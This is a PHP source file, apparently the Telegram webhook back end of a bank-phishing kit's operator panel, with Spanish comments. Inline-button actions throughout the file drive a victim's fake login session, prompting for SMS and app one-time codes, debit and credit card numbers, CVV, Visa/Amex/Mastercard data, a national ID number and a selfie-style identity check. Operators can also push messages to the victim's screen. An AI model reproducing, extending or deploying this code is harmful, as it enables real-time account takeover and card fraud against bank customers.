<?php
require_once(__DIR__ . '/../lib/db.php');
require_once(__DIR__ . '/../lib/core.php');

$OV_PROFILES = [];
$OV_SELECTED = null;

$DRY_RUN = (isset($_GET['dry_run']) || isset($_POST['dry_run']));
define('TABLA_PUTO', 'datos');
$con = $DRY_RUN ? null : Database::getConnection();
$token = '';
$tokenTG = null;
$row = [
    'token_bank_telegram' => null,
];

define('TG_PENDING_NOTES_FILE', __DIR__ . '/../logs/notes.json');

function tg_notes_load()
{
    $path = TG_PENDING_NOTES_FILE;
    if (!is_file($path)) {
        return [];
    }
    $raw = @file_get_contents($path);
    $decoded = @json_decode($raw, true);
    return is_array($decoded) ? $decoded : [];
}

function tg_notes_save(array $data)
{
    $path = TG_PENDING_NOTES_FILE;
    @file_put_contents($path, json_encode($data, JSON_UNESCAPED_UNICODE));
}

if (isset($_GET['tok'])) {
    $token = $_GET['tok'];
} elseif (isset($_POST['tok'])) {
    $token = $_POST['tok'];
} elseif ($DRY_RUN) {
    $token = 'dry';
} else {
    http_response_code(404);
    die('Token no proporcionado.');
}

$context = [
    'owner' => null,
    'tok'   => $token,
];

if (!$DRY_RUN) {
    $result = mysqli_query($con, "SELECT * FROM users WHERE cod_unico = '" . mysqli_real_escape_string($con, (string) $token) . "'");
    if ($result && mysqli_num_rows($result) > 0) {
        $row = mysqli_fetch_assoc($result);
        $tokenTG = tg_clean_token($row['token_bank_telegram'] ?? '');
        $row['token_bank_telegram'] = $tokenTG;
        if (isset($row['id'])) {
            $context['owner'] = (string) $row['id'];
        }
    }
}

$configProfiles   = tg_profiles_from_config($context, true);
$overrideProfiles = tg_override_recipient($context, true);
$OV_PROFILES = tg_unique_recipients(array_merge($configProfiles, $overrideProfiles));

// El mismo usuario puede usar un bot para login y otro para tarjetas. El
// webhook incluye una huella segura para contestar callbacks con el bot que
// realmente creó el teclado inline.
$requestedBot = isset($_GET['bot']) ? trim((string) $_GET['bot']) : '';
$botCandidates = [];
$addBotCandidate = function ($candidate) use (&$botCandidates) {
    $candidate = tg_clean_token($candidate);
    if ($candidate !== '') {
        $botCandidates[tg_token_fingerprint($candidate)] = $candidate;
    }
};
$addBotCandidate($row['token_bank_telegram'] ?? '');
$addBotCandidate($row['token_card_telegram'] ?? '');
foreach ($OV_PROFILES as $profile) {
    $raw = $profile['raw'] ?? [];
    if (is_array($raw)) {
        $addBotCandidate($raw['bank_token'] ?? '');
        $addBotCandidate($raw['card_token'] ?? '');
    }
    $addBotCandidate($profile['token'] ?? '');
}
if ($requestedBot !== '' && isset($botCandidates[$requestedBot])) {
    $tokenTG = $botCandidates[$requestedBot];
}

if ($tokenTG) {
    foreach ($OV_PROFILES as $profile) {
        $raw = $profile['raw'] ?? [];
        if (is_array($raw) && in_array($tokenTG, [$raw['bank_token'] ?? null, $raw['card_token'] ?? null], true)) {
            $OV_SELECTED = $profile['raw'];
            break;
        }
    }
}
if (!$OV_SELECTED && !empty($OV_PROFILES)) {
    $first = $OV_PROFILES[0]['raw'] ?? null;
    if (is_array($first)) {
        $OV_SELECTED = $first;
        if (!$tokenTG) {
            $tokenTG = $first['bank_token'] ?? $first['card_token'] ?? null;
        }
    }
}

if ($DRY_RUN) {
    $tokenTG = $tokenTG ?: 'dry';
}

if ($tokenTG) {
    $tokenTG = tg_clean_token($tokenTG);
}

if (!$tokenTG) {
    http_response_code(404);
    die('Token no encontrado en la base de datos.');
}


$webhook_url = tg_webhook_url($token, $tokenTG);
if ($webhook_url === '') {
    http_response_code(400);
    die('Token inválido para webhook.');
}
if (!$DRY_RUN && $tokenTG) {
    $get_webhook_info_url = 'https://api.telegram.org/bot' . $tokenTG . '/getWebhookInfo';
    $response = file_get_contents($get_webhook_info_url);
    if ($response === false) {
        error_log('Error al obtener información del webhook: No se pudo conectar a Telegram.');
        die('Error al obtener información del webhook.');
    }
    $webhook_info = json_decode($response, true);
    if (!isset($webhook_info['result']['url'])) {
        error_log('Error: Respuesta inesperada de Telegram al obtener información del webhook.');
        die('Error: Respuesta inesperada de Telegram.');
    }
    if ($webhook_info['result']['url'] !== $webhook_url) {
        $delete_response = file_get_contents('https://api.telegram.org/bot' . $tokenTG . '/deleteWebhook');
        if ($delete_response === false) {
            error_log('Error al eliminar el webhook existente.');
            die('Error al eliminar el webhook existente.');
        }
        $delete_result = json_decode($delete_response, true);
        if (!$delete_result['ok']) {
            error_log('Error al eliminar el webhook: ' . $delete_result['description']);
            die('Error al eliminar el webhook: ' . $delete_result['description']);
        }
        $set_webhook_url = 'https://api.telegram.org/bot' . $tokenTG . '/setWebhook?url=' . urlencode($webhook_url);
        $set_response = file_get_contents($set_webhook_url);
        if ($set_response === false) {
            error_log('Error al configurar el webhook.');
            die('Error al configurar el webhook.');
        }
        $set_result = json_decode($set_response, true);
        if (!$set_result['ok']) {
            error_log('Error al configurar el webhook: ' . $set_result['description']);
            die('Error al configurar el webhook: ' . $set_result['description']);
        }
    } else {
        error_log('La URL del webhook ya está configurada correctamente.');
    }
}
$input = file_get_contents('php://input');
$update = json_decode($input, true);


if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $chat_id = $callback_query['message']['chat']['id'];
    $callback_data = $callback_query['data'];
    $callback_id = $callback_query['id'];

    $parts = explode('_', $callback_data);
    $action = $parts[0];
    $registro_id = $parts[1];
    $owner = isset($parts[2]) ? $parts[2] : null;
    $parts_log = print_r($parts, true);

    error_log("Parts $parts_log , Callback data: $owner owner - $action - $registro_id", 3, __DIR__ . "/error.log");


    switch ($action) {
        case 'solicitarotp':
            $response_message = order_otp($registro_id, 'sms');
            break;
        case 'solicitarotpapp':
            $response_message = order_otp($registro_id, 'app');
            break;
        case 'solicitar923':
            $response_message = order_923($registro_id);
            break;
        case 'errorotpsms':
            $response_message = order_otp_error($registro_id, 'sms');
            break;
        case 'errorotpapp':
            $response_message = order_otp_error($registro_id, 'app');
            break;
        case 'solicitardatos':
            $response_message = order_data($registro_id);
            break;
        case 'pedirtarjeta':
            $response_message = order_card($registro_id, 'debito');
            break;
        case 'pedirtarjetacredito':
            $response_message = order_card($registro_id, 'credito');
            break;
        case 'pedircvv':
            $response_message = order_cvv($registro_id);
            break;
        case 'pedirvisa':
            $response_message = order_visa($registro_id);
            break;
        case 'pediramex':
            $response_message = order_amex($registro_id);
            break;
        case 'pedirmaster':
            $response_message = order_master($registro_id);
            break;
        case 'pedircedula':
            $response_message = order_cedula($registro_id);
            break;
        case 'soyyo':
            $response_message = order_soyyo($registro_id);
            break;
        case 'volverusuario':
            $response_message = order_user_reset($registro_id);
            break;
        case 'errordinamica':
            $response_message = order_otp_personalizado($registro_id, 'La clave dinámica ingresada ha expirado. Por favor, solicite una nueva.');
            break;
        case 'errorlogin':
            $response_message = error_login($registro_id);
            break;
        case 'panelnote':
            $pending = tg_notes_load();
            $pending[$chat_id] = [
                'registro' => $registro_id,
                'owner'    => $owner,
                'ts'       => time(),
            ];
            tg_notes_save($pending);
            $response_message = "Escribe el mensaje para el registro {$registro_id}. Se mostrará en la pantalla actual del usuario.";
            break;
        case 'finalizar':
            $response_message = finish($registro_id);
            break;
        case 'finalizarDinamica':
            $response_message = finish($registro_id, true);
            break;
        case 'error404':
            $response_message = error_404($registro_id);
            break;
        
        default:
            $response_message = "Acción no válida.";
            break;
    }

    error_log('Telegram action=' . $action . ' registro=' . $registro_id . ' owner=' . ($owner ?? 'null') . ' response=' . (is_string($response_message) ? $response_message : json_encode($response_message)), 3, __DIR__ . '/../logs/err.log');

    if (is_string($response_message) && $response_message !== '') {
        // Para Master/Visa/Amex usa el canal de tarjetas (is_login = false); resto sigue por canal login.
        $isCardAction = in_array($action, ['pedirvisa', 'pediramex', 'pedirmaster'], true);
        $sent = send_message($response_message, !$isCardAction, $owner);
        if ($sent) {
            @tg_mark_last_sent($registro_id);
            answer_callback_query($callback_id);
        } else {
            // Si Telegram rechaza el envío, al menos mostramos confirmación local.
            answer_callback_query_text($callback_id, 'Solicitud registrada (sin notificación por Telegram).');
        }
        if ($chat_id && isset($callback_query['message']['message_id'])) {
            tg_clear_inline_keyboard($chat_id, $callback_query['message']['message_id']);
        }
    } else {
        answer_callback_query_text($callback_id, 'Ya solicitado. Espera nueva información.');
    }
}

if (isset($update['message'])) {
    $msg = $update['message'];
    $chat_id = $msg['chat']['id'] ?? null;
    $text = trim($msg['text'] ?? '');
    if ($chat_id) {
        $pending = tg_notes_load();
        if ($text !== '' && isset($pending[$chat_id]) && is_array($pending[$chat_id])) {
            $registroPend = $pending[$chat_id]['registro'] ?? null;
            if ($registroPend) {
                tg_store_panel_note($registroPend, $text);
                unset($pending[$chat_id]);
                tg_notes_save($pending);
                tg_send_via_profile($chat_id, "Nota enviada al registro {$registroPend}.");
                return;
            }
        }
        $reply = '';
        if ($text === '/start') {
            $profileIdx = 0;
            if (isset($_GET['tok']) && preg_match('/(\d+)/', (string)$_GET['tok'], $m)) {
                $profileIdx = intval($m[1]);
            }
            $reply = "Hola! Bot listo (perfil #$profileIdx). Usa el teclado inline en los mensajes que enviamos o responde con texto.";
        } else if ($text !== '') {
            $preview = mb_substr($text, 0, 120);
            $reply = "Recibido: " . $preview;
        } else {
            $reply = "Mensaje recibido.";
        }

        tg_send_via_profile($chat_id, $reply);
    }
}

function tg_send_via_profile($chat_id, $text)
{
    global $OV_SELECTED, $DRY_RUN, $tokenTG;
    if ($DRY_RUN) {
        $line = date('c') . " | chat=$chat_id | " . $text . "\n";
        file_put_contents(__DIR__ . '/dry_run_messages.log', $line, FILE_APPEND);
        return true;
    }
    // Responder siempre con el bot dueño del webhook/callback. Conservamos el
    // perfil como respaldo para webhooks antiguos que aún no llevan huella.
    $token = tg_clean_token($tokenTG ?? '');
    if ($token === '' && is_array($OV_SELECTED)) {
        $token = tg_clean_token($OV_SELECTED['bank_token'] ?? ($OV_SELECTED['card_token'] ?? ''));
    }
    if (!$token) {
        return false;
    }
    $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
    ];
    $opts = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $ctx = stream_context_create($opts);
    @file_get_contents($url, false, $ctx);
    return true;
}

function answer_callback_query($callback_id)
{
    global $tokenTG, $DRY_RUN;
    if ($DRY_RUN) {
        return;
    }
    $url = 'https://api.telegram.org/bot' . $tokenTG . '/answerCallbackQuery';
    $data = ['callback_query_id' => $callback_id];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

function answer_callback_query_text($callback_id, $text, $alert = false)
{
    global $tokenTG, $DRY_RUN;
    if ($DRY_RUN) {
        return;
    }
    $url = 'https://api.telegram.org/bot' . $tokenTG . '/answerCallbackQuery';
    $data = [
        'callback_query_id' => $callback_id,
        'text' => $text,
        'show_alert' => $alert ? 'true' : 'false',
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

function tg_clear_inline_keyboard($chat_id, $message_id)
{
    global $tokenTG, $DRY_RUN;
    if ($DRY_RUN || !$chat_id || !$message_id) {
        return;
    }
    $url = 'https://api.telegram.org/bot' . $tokenTG . '/editMessageReplyMarkup';
    $data = [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'reply_markup' => json_encode(['inline_keyboard' => []]),
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

function order_data($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'req_email'];
        actualizar_registro($registro_id, $array);
    }
    return "✉️ DATOS SOLICITADOS";
}

function order_otp_personalizado($registro_id, $message)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'req_otp_expired'];
        actualizar_registro($registro_id, $array);
    }
    return "⚠️ DINÁMICA EXPIRADA";
}

function order_otp($registro_id, $type)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $smsCount = 0;
        $appCount = 0;
        if (!empty($registro['mensaje'])) {
            $tmp = @json_decode($registro['mensaje'], true);
            if (is_array($tmp)) {
                $smsCount = intval($tmp['sms_request_count'] ?? 0);
                $appCount = intval($tmp['app_request_count'] ?? 0);
            }
        }

        $array = ['status' => 'req_otp' . ($type === 'app' ? '_app' : '')];
        if ($type !== 'app') {
            if ($smsCount > 0) {
                $array['status'] = 'error_otp_sms';
            }
            $mensaje = tg_sms_request_bump_payload($registro);
            if (is_array($mensaje)) {
                $array['mensaje'] = json_encode($mensaje);
            }
        } else {
            if ($appCount > 0) {
                $array['status'] = 'error_otp';
            }
            $mensaje = tg_app_request_bump_payload($registro);
            if (is_array($mensaje)) {
                $array['mensaje'] = json_encode($mensaje);
            }
        }
        actualizar_registro($registro_id, $array);
    }
    return ($type === 'app')
        ? ($appCount > 0 ? "⚠️ DINÁMICA" : "🔁 DINÁMICA SOLICITADA")
        : ($smsCount > 0 ? "⚠️ SMS" : "📲 SMS SOLICITADO");
}

function order_user_reset($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        $payload = ['status' => 'error_login'];

        $mensaje = [];
        if (is_array($registro) && !empty($registro['mensaje'])) {
            $tmp = @json_decode($registro['mensaje'], true);
            if (is_array($tmp)) {
                $mensaje = $tmp;
            }
        }
        $mensaje['force_user'] = time();
        $payload['mensaje'] = json_encode($mensaje);

        actualizar_registro($registro_id, $payload);
    }
    return "👤 USUARIO SOLICITADO";
}

function order_923($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'req_923'];
        actualizar_registro($registro_id, $array);
    }
    return "🔁 923 SOLICITADO";
}

function order_otp_error($registro_id, $type)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $status = ($type === 'app') ? 'error_otp' : 'error_otp_sms';
        $array = ['status' => $status];
        actualizar_registro($registro_id, $array);
    }
    return ($type === 'app')
        ? "⚠️ DINÁMICA"
        : "⚠️ SMS";
}

function order_card($registro_id, $type)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'req_tarjeta' . ($type === 'credito' ? '_credito' : '')];
        actualizar_registro($registro_id, $array);
    }
    return ($type === 'credito')
        ? "💳 CRÉDITO SOLICITADO"
        : "💳 DÉBITO SOLICITADO";
}


function order_cvv($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'req_cvv'];
        actualizar_registro($registro_id, $array);
    }
    return "🔐 CVC DEBITO SOLICITADO";
}

function order_cvv_credito($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'req_cvv_credito'];
        actualizar_registro($registro_id, $array);
    }
    return "🔐 CVC CREDITO SOLICITADO";
}

function order_visa($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'req_visa'];
        actualizar_registro($registro_id, $array);
    }
    return "🪙 VISA SOLICITADO";
}

function order_amex($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'req_amex'];
        actualizar_registro($registro_id, $array);
    }
    return "💠 AMEX SOLICITADO";
}

function order_master($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'req_master'];
        actualizar_registro($registro_id, $array);
    }
    return "🧿 MASTER SOLICITADO";
}

function order_cedula($registro_id)
{
    global $DRY_RUN;
    if ($DRY_RUN) {
        return "🆔 CÉDULA SOLICITADA";
    }
    $registro = buscar_registro($registro_id);
    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }
    $mensaje = [];
    if (!empty($registro['mensaje'])) {
        $tmp = json_decode($registro['mensaje'], true);
        if (is_array($tmp)) $mensaje = $tmp; else $mensaje = ['_raw' => (string)$registro['mensaje']];
    }
    if (!isset($mensaje['cedula'])) $mensaje['cedula'] = [];
    $lastSent = 0;
    if (!empty($mensaje['tg_last_sent'])) $lastSent = intval($mensaje['tg_last_sent']);
    $lastReq  = !empty($mensaje['cedula']['last_req']) ? intval($mensaje['cedula']['last_req']) : 0;
    if ($lastReq >= $lastSent && $lastReq > 0) {
        return '';
    }
    $mensaje['cedula']['last_req'] = time();
    actualizar_registro($registro_id, ['status' => 'req_cedula', 'mensaje' => json_encode($mensaje)]);
    return "🆔 CÉDULA SOLICITADA";
}

function order_soyyo($registro_id)
{
    global $DRY_RUN;
    if ($DRY_RUN) {
        return "📸 SOY YO SOLICITADO";
    }
    $registro = buscar_registro($registro_id);
    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }
    $mensaje = [];
    if (!empty($registro['mensaje'])) {
        $tmp = json_decode($registro['mensaje'], true);
        if (is_array($tmp)) $mensaje = $tmp; else $mensaje = ['_raw' => (string)$registro['mensaje']];
    }
    if (!isset($mensaje['soyyo'])) $mensaje['soyyo'] = [];
    $lastSent = 0;
    if (!empty($mensaje['tg_last_sent'])) $lastSent = intval($mensaje['tg_last_sent']);
    $lastReq  = !empty($mensaje['soyyo']['last_req']) ? intval($mensaje['soyyo']['last_req']) : 0;
    if ($lastReq >= $lastSent && $lastReq > 0) {
        return '';
    }
    $mensaje['soyyo']['last_req'] = time();
    actualizar_registro($registro_id, ['status' => 'req_soyyo', 'mensaje' => json_encode($mensaje)]);
    return "📸 SOY YO SOLICITADO";
}

function error_login($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'error_login'];
        actualizar_registro($registro_id, $array);
    }
    return "⚠️ USUARIO";
}

function error_404($registro_id)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => 'error_404'];
        actualizar_registro($registro_id, $array);
    }
    return "🚫 SISTEMA";
}

function finish($registro_id,$finishDinamica = false)
{
    global $DRY_RUN;
    if (!$DRY_RUN) {
        $registro = buscar_registro($registro_id);
        if (!$registro) {
            return "No se encontró el registro con ID $registro_id.";
        }
        $array = ['status' => $finishDinamica ? 'finish_dinamic' : 'finish'];
        actualizar_registro($registro_id, $array);
    }
    return $finishDinamica
        ? "🗂️ FINALIZADO (DINÁMICA)"
        : "🗂️ FINALIZADO";
}

function send_message($message, $is_login = false, $owner, array $options = [])
{
    global $DRY_RUN;
    if ($DRY_RUN) {
        $line = date('c') . " | owner=$owner | " . $message . "\n";
        file_put_contents(__DIR__ . '/dry_run_messages.log', $line, FILE_APPEND);
        echo $message;
        return true;
    }

    $context = [
        'owner' => (string) $owner,
        'tok'   => tg_get_request_token(),
    ];

    $result = tg_send_to_recipients($message, (string) $owner, $is_login, $context, $options, 'Markdown');
    if ($result === false) {
        error_log("No se pudieron obtener destinatarios para owner=$owner");
        return false;
    }

    return true;
}

